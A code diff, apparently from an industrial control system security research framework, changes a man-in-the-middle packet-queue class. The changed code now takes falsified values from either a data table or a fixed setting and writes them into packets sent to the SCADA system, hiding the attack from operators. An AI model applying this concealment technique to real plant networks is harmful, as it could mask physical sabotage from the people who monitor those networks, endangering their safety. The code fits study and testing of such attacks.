@@ -67,10 +67,16 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
 
                     elif this_session in self.scada_session_ids:
                         self.logger.debug('Concealing to SCADA: ' + str(this_session))
-                        exp = (self.concealment_data_pd['iteration'] == self.get_master_clock())
-                        concealment_value = float(self.concealment_data_pd.loc[exp][self.attacked_tag].values[-1])
-                        self.logger.debug('Concealing with value: ' + str(concealment_value))
-                        p[Raw].load = translate_float_to_payload(concealment_value, p[Raw].load)
+
+                        if self.intermediate_attack['concealment_data']['type'] == 'path':
+
+                            exp = (self.concealment_data_pd['iteration'] == self.get_master_clock())
+                            concealment_value = float(self.concealment_data_pd.loc[exp][self.attacked_tag].values[-1])
+                            self.logger.debug('Concealing with value: ' + str(concealment_value))
+                            p[Raw].load = translate_float_to_payload(concealment_value, p[Raw].load)
+                        elif self.intermediate_attack['concealment_data']['type'] == 'value':
+                            concealment_value = float(self.intermediate_attack['concealment_data']['value'])
+                            p[Raw].load = translate_float_to_payload(concealment_value, p[Raw].load)
 
                         del p[IP].chksum
                         del p[TCP].chksum
